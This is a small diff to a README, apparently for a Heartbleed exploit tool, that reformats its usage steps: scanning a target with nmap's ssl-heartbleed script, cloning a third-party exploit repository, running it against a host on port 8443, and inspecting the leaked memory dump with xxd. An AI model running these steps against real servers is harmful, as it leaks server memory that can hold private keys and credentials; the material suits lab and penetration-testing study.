@@ -19,15 +19,9 @@ options:
 ```nmap -v -p8443 --script ssl-heartbleed $IP```
 
 3. Install the script if you haven't already, change to directory:
-```
-git clone https://github.com/H4R335HR/heartbleed/ && cd heartbleed
-```
+```git clone https://github.com/H4R335HR/heartbleed/ && cd heartbleed```
   
 4. Run the script:
-```
-python3 heartbleed.py $IP 8443
-```
+```python3 heartbleed.py $IP 8443```
 5. After running the script, check the output file using xxd to see the results:
-```
-xxd response_data.bin
-```
+```xxd response_data.bin```
